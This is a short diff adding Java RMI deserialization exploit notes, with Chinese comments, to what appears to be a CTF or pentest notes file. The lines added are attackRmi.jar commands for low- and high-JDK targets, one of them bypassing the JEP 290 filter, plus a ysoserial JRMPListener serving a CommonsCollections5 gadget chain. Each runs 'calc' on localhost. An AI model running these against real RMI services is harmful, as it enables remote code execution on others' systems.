@@ -79,6 +79,19 @@ public class Cmd implements AutoCloseable{
 ```
 
 
+# rmi bypass jep
+https://github.com/waderwu/attackRmi
+jdk版本低 
+```java
+java -jar attackRmi.jar DOL 127.0.0.1 6666 'calc'
+```
+jdk高bypass jep  
+```
+java -jar attackRmi.jar LAUS 127.0.0.1 1099 127.0.0.1 9090 'calc'
+
+jrmp服务： java -cp ysoserial.jar ysoserial.exploit.JRMPListener 9090 CommonsCollections5 'calc'
+```
+
 
 > wp
 >
